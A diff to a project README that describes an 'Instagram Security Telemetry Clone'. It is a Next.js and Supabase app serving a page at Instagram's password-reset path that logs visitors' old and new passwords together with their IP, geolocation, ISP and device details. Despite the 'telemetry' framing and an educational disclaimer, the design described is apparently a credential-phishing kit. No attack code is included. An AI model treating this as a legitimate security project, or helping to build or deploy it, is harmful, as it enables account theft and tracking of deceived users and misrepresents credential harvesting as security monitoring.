@@ -1,36 +1,323 @@
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
+# Instagram Security Telemetry Clone
 
-## Getting Started
+A modern security telemetry and audit logging system built with Next.js, Supabase, and Vercel.
 
-First, run the development server:
+This project started as a simple password reset flow experiment and evolved into an event-driven security monitoring system with:
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
+- session correlation
+- geo-ip telemetry
+- device/browser detection
+- audit event tracking
+- serverless backend architecture
+
+---
+
+# Features
+
+## Security Event Tracking
+
+Track user actions as correlated events:
+
+- `app_open`
+- `password_confirm`
+- `password_reset`
+
+---
+
+## Session Correlation
+
+Every flow shares the same:
+
+```txt
+session_id
 ```
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+allowing all user interactions to be grouped into one timeline.
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+---
 
-This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
+## Geo-IP Telemetry
 
-## Learn More
+Using:
 
-To learn more about Next.js, take a look at the following resources:
+- IP address lookup
+- location detection
+- ISP detection
+- proxy/hosting detection
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+Powered by:
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
+```txt
+ip-api.com
+```
 
-## Deploy on Vercel
+---
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+## Device & Browser Detection
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+Automatic parsing from `user-agent`:
+
+- browser
+- operating system
+- device type
+
+---
+
+## Serverless Backend
+
+Built entirely with:
+
+- Next.js API Routes
+- deployed on Vercel
+
+No separate backend server required.
+
+---
+
+# Stack
+
+## Frontend
+
+- Next.js 15
+- React
+- TypeScript
+
+## Backend
+
+- Next.js Route Handlers
+- Supabase PostgreSQL
+
+## Hosting
+
+- Vercel
+
+---
+
+# Project Structure
+
+```txt
+src/
+├── app/
+│   ├── accounts/
+│   └── api/
+│       ├── accounts/
+│       └── security/
+│
+├── components/
+│
+├── lib/
+│   ├── security/
+│   ├── supabase/
+│   └── validations/
+│
+├── types/
+│
+└── utils/
+```
+
+---
+
+# Security Event Flow
+
+## 1. App Open
+
+Triggered when user opens the page:
+
+```txt
+/accounts/password/reset/confirm
+```
+
+Telemetry captured:
+
+- IP
+- browser
+- OS
+- device
+- geo-ip
+- pathname
+
+---
+
+## 2. Password Confirm
+
+Triggered when user submits current password.
+
+Payload example:
+
+```json
+{
+  "old_password": "xxxxx"
+}
+```
+
+---
+
+## 3. Password Reset
+
+Triggered when user submits new password.
+
+Payload example:
+
+```json
+{
+  "new_password": "xxxxx"
+}
+```
+
+---
+
+# Database Schema
+
+## events_audit
+
+Main event telemetry table.
+
+Core fields:
+
+- session_id
+- event_type
+- ip_address
+- user_agent
+- browser
+- os
+- device_type
+- payload (jsonb)
+
+---
+
+# Environment Variables
+
+Create:
+
+```env
+.env.local
+```
+
+Add:
+
+```env
+NEXT_PUBLIC_SUPABASE_URL=
+SUPABASE_SERVICE_ROLE_KEY=
+```
+
+---
+
+# Important Security Notes
+
+## DO NOT expose:
+
+```txt
+SUPABASE_SERVICE_ROLE_KEY
+```
+
+This key:
+
+- bypasses RLS
+- has admin privileges
+- should only run on the server
+
+---
+
+# Local Development
+
+Install dependencies:
+
+```bash
+yarn install
+```
+
+Run development server:
+
+```bash
+yarn dev
+```
+
+Build production:
+
+```bash
+yarn build
+```
+
+---
+
+# Deployment
+
+This project is optimized for:
+
+- Vercel
+- Supabase
+
+Deployment flow:
+
+1. Push to GitHub
+2. Vercel auto-builds
+3. API routes become serverless backend functions
+
+---
+
+# Current Limitations
+
+## Temporary TypeScript Relaxation
+
+Current build config includes:
+
+```ts
+typescript: {
+  ignoreBuildErrors: true;
+}
+
+eslint: {
+  ignoreDuringBuilds: true;
+}
+```
+
+This is temporary during rapid prototyping.
+
+Future improvement:
+
+- generate official Supabase types
+- restore strict typing
+
+---
+
+# Future Improvements
+
+- Dashboard analytics
+- Suspicious login detection
+- Impossible travel detection
+- Session replay metadata
+- Advanced telemetry correlation
+- Map visualization
+- Threat scoring
+- Proxy/VPN heuristics
+
+---
+
+# Architecture Philosophy
+
+This project follows:
+
+- event-driven logging
+- telemetry-first architecture
+- serverless backend patterns
+- payload extensibility
+- lightweight fingerprinting
+
+---
+
+# Disclaimer
+
+This project is for:
+
+- educational purposes
+- telemetry experiments
+- security research
+- UI/UX replication practice
+
+Do not use for unauthorized credential collection or malicious activity.
+
+---
+
+# License
+
+MIT
